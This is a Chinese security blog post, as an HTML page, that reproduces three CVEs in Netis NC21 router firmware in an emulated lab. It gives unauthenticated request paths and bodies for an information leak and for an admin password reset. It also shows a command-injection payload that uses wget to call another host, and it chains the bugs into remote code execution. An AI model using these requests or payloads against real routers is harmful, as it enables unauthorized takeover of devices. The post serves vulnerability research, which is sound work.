@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Closure" />
+  <meta name="description" content="" />
+  <meta name="google-site-verification" content="ume8wxFIzFnN-uS2NK6TLbEnB0OL8U3QYLpG-0v0NPM" />
+  
+  
+  <title>
+    
+      Netis路由器未授权RCE复现 
+      
+      
+      |
+    
+     Closure
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Closure</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Netis路由器未授权RCE复现</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2025-01-18 10:32:08
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/IOT%E5%AE%89%E5%85%A8/" title="IOT安全">
+                    #IOT安全
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/" title="路由器安全">
+                    #路由器安全
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="Netis路由器未授权RCE复现"><a href="#Netis路由器未授权RCE复现" class="headerlink" title="Netis路由器未授权RCE复现"></a>Netis路由器未授权RCE复现</h1><p>漏洞编号：</p>
+<p>CVE-2024-48455、CVE-2024-48456 和 CVE-2024-48457</p>
+<p>参考链接：</p>
+<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;h00die-gr3y&#x2F;h00die-gr3y&#x2F;issues&#x2F;2</code></pre>
+
+
+
+<h2 id="固件"><a href="#固件" class="headerlink" title="固件"></a>固件</h2><p>netis_NC21_V3.0.0.3800.bin ( <a target="_blank" rel="noopener" href="https://www.netisru.com/support/downinfo.html?id=40">https://www.netisru.com/support/downinfo.html?id=40</a> )</p>
+<p>文件系统提取：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">binwalk <span class="token parameter variable">-Me</span> 【file】</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202501142325677.png" alt="image-20250114232544632"></p>
+<h2 id="模拟运行"><a href="#模拟运行" class="headerlink" title="模拟运行"></a>模拟运行</h2><p>模拟工具：firmware-analysis-toolkit</p>
+<p>搭建环境：</p>
+<ul>
+<li>Win11</li>
+<li>AttifyOS[192.168.121.151]</li>
+<li>firmware-analysis-toolkit[192.168.1.1:80]</li>
+</ul>
+<p>模拟固件：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">./fat.py Netis<span class="token punctuation">\</span><span class="token punctuation">(</span>NC21<span class="token punctuation">\</span><span class="token punctuation">)</span>-V3.0.0.3800.bin</code></pre>
+
+<p>由于我需要在Win11进行后续复现，所以做了端口转发：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> iptables <span class="token parameter variable">-t</span> nat <span class="token parameter variable">-A</span> PREROUTING <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">--dport</span> <span class="token number">1234</span> <span class="token parameter variable">-j</span> DNAT --to-destination <span class="token number">192.168</span>.1.1:80
+<span class="token function">sudo</span> iptables <span class="token parameter variable">-t</span> nat <span class="token parameter variable">-A</span> POSTROUTING <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-d</span> <span class="token number">192.168</span>.1.1 <span class="token parameter variable">--dport</span> <span class="token number">80</span> <span class="token parameter variable">-j</span> MASQUERADE
+<span class="token function">sudo</span> <span class="token function">sysctl</span> <span class="token parameter variable">-w</span> <span class="token assign-left variable">net.ipv4.ip_forward</span><span class="token operator">=</span><span class="token number">1</span>
+<span class="token function">sudo</span> <span class="token function">sysctl</span> <span class="token parameter variable">-p</span></code></pre>
+
+<p>模拟成功：</p>
+<p>在进行一系列初始化后到登陆页面</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202501162328344.png" alt="image-20250116232813270"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="CVE-2024-48455"><a href="#CVE-2024-48455" class="headerlink" title="CVE-2024-48455"></a>CVE-2024-48455</h3><p>随便抓个包，此处为在登陆页抓了一个：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202501162338741.png" alt="image-20250116233834647"></p>
+<p>触发漏洞POST需修改</p>
+<ul>
+<li><p>请求路径</p>
+<pre class="language-none"><code class="language-none">POST &#x2F;cgi-bin&#x2F;skk_get.cgi HTTP&#x2F;1.1</code></pre>
+</li>
+<li><p>请求体</p>
+<pre class="language-none"><code class="language-none">mode_name&#x3D;skk_get&amp;wl_link&#x3D;0</code></pre></li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202501162341768.png" alt="image-20250116234100716"></p>
+<p>发送POST请求即可触发漏洞获取路由器的所有信息，此漏洞无需进行任何的身份验证</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202501162340615.png" alt="image-20250116234038456"></p>
+<h3 id="CVE-2024-48456"><a href="#CVE-2024-48456" class="headerlink" title="CVE-2024-48456"></a>CVE-2024-48456</h3><p>这个漏洞是发生在[工具]-[管理员密码]</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202501162329099.png" alt="image-20250116232915019"></p>
+<p>抓个修改管理员密码的请求</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202501162332035.png" alt="image-20250116233248940"></p>
+<p>触发漏洞POST需修改请求体字段值</p>
+<ul>
+<li>password</li>
+<li>new_pwd_confirm</li>
+</ul>
+<p>改为：注意此处为要取新密码得base64值</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202501162333999.png" alt="image-20250116233347946"></p>
+<p>也就是此处我管理员的新密码就为</p>
+<pre class="language-none"><code class="language-none">&#96;wget http:&#x2F;&#x2F;192.168.1.2:8000;ip a &gt; &#x2F;test&#96;</code></pre>
+
+<p>修改后请求：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202501162334889.png" alt="image-20250116233435830"></p>
+<p>在Attfiy开一个http服务器，此处只要你模拟的路由器能访问到即可</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202501162334697.png" alt="image-20250116233447682"></p>
+<p>放行请求：http就发现被路由器请求了，也就是字段中的值被执行了</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://192.168.1.2:8000</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202501162335731.png" alt="image-20250116233523704"></p>
+<p>观察模拟环境：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202501162335793.png" alt="image-20250116233516761"></p>
+<p>于模拟环境中查看；后续命令 <strong>ip a &gt; &#x2F;test</strong> 执行情况：执行成功</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202501162335554.png" alt="image-20250116233554515"></p>
+<p>漏洞为授权的命令注入</p>
+<p>漏洞成因为**&#x2F;bin&#x2F;scripts&#x2F;password.sh**，这是一个软链接，指向cscripts，为一个ELF，password.sh于GUI中执行调用，也就是GUI程序使用这个作为password命令进行新密码的修改</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202501170111096.png" alt="image-20250117011126051"></p>
+<p>IDA分析，可根据上述模拟环境提供的字符串定位</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202501170113680.png" alt="image-20250117011356652"></p>
+<p>交叉引用定位函数：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202501170114914.png" alt="image-20250117011447874"></p>
+<p>RunSystemCmd是一个库函数，来自libapmib.so</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202501170117837.png" alt="image-20250117011743796"></p>
+<p>直接就是system执行了，当然对拼接符号不做限制，上述用的是单引号，用分号这些效果一样：</p>
+<p>使用分号例：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202501170126385.png" alt="image-20250117012628344"></p>
+<p>触发漏洞执行命令：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202501170125797.png" alt="image-20250117012503773"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202501170125934.png" alt="image-20250117012521904"></p>
+<h3 id="CVE-2024-48457"><a href="#CVE-2024-48457" class="headerlink" title="CVE-2024-48457"></a>CVE-2024-48457</h3><p>与CVE-2024-48456抓包一样即可，抓一个登陆包，改一下请求路径和请求体：</p>
+<p>请求路径：</p>
+<pre class="language-none"><code class="language-none">POST &#x2F;cgi-bin&#x2F;skk_set.cgi HTTP&#x2F;1.1</code></pre>
+
+<p>请求体：</p>
+<p>注意值也是需要base64处理</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202501162345758.png" alt="image-20250116234528719"></p>
+<p>修改字段为wpaPsk和password字段</p>
+<pre class="language-none"><code class="language-none">wl2g_idx&#x3D;6&amp;wl5g_idx&#x3D;0&amp;wlanMode&#x3D;0&amp;wl_idx&#x3D;0&amp;ssid2g&#x3D;bmV0aXMtMDAwMDAw&amp;ssid5g&#x3D;bmV0aXMtMDAwMDAwLTVH&amp;encrypt&#x3D;4&amp;wpaPsk&#x3D;Q2xvc3VyZQ&#x3D;&#x3D;&amp;wpaPskType&#x3D;2&amp;wpaPskFormat&#x3D;0&amp;password&#x3D;Q2xvc3VyZQ&#x3D;&#x3D;&amp;autoUpdate&#x3D;0&amp;firstSetup&#x3D;1&amp;quick_set&#x3D;ap&amp;app&#x3D;wan_set_shortcut&amp;wl_link&#x3D;0</code></pre>
+
+<p>发送请求并收到回复</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202501162344185.png" alt="image-20250116234417135"></p>
+<p>此时管理员密码已经被重置为你使用base64的值，我此处为Closure，即可登陆路由器</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202501162345479.png" alt="image-20250116234514379"></p>
+<p>此漏洞为未授权初始化设置路由器密码可随时重复请求导致的获取管理员权限，此漏洞配合CVE-2024-48456即可实现未授权命令执行</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2024/08/19/Totolink-X5000R-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2025-01-18 10:32:08
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/IOT%E5%AE%89%E5%85%A8/" title="IOT安全">
+                        #IOT安全
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/" title="路由器安全">
+                        #路由器安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2099/06/18/%E5%B7%A5%E5%85%B7%E4%B8%8E%E5%91%BD%E4%BB%A4/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Netis%E8%B7%AF%E7%94%B1%E5%99%A8%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E5%A4%8D%E7%8E%B0"><span class="toc-text">Netis路由器未授权RCE复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6"><span class="toc-text">固件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%8B%9F%E8%BF%90%E8%A1%8C"><span class="toc-text">模拟运行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-48455"><span class="toc-text">CVE-2024-48455</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-48456"><span class="toc-text">CVE-2024-48456</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-48457"><span class="toc-text">CVE-2024-48457</span></a></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zh-Closure">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">Copyright © 2025 Closure</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">email | 765003952@qq.com</a>
+        
+    </div>
+  
+  
+    <div class="footer-views">
+      
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+      
+      
+          本站访客数<span id="busuanzi_value_site_uv"></span>人
+        
+      
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="可露希尔大涨价……">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Netis%E8%B7%AF%E7%94%B1%E5%99%A8%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E5%A4%8D%E7%8E%B0 + '&url=' + http%3A%2F%2Fexample.com%2F2025%2F01%2F18%2FNetis%25E8%25B7%25AF%25E7%2594%25B1%25E5%2599%25A8%25E6%259C%25AA%25E6%258E%2588%25E6%259D%2583RCE%25E5%25A4%258D%25E7%258E%25B0%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2025/01/18/Netis%E8%B7%AF%E7%94%B1%E5%99%A8%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E5%A4%8D%E7%8E%B0/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
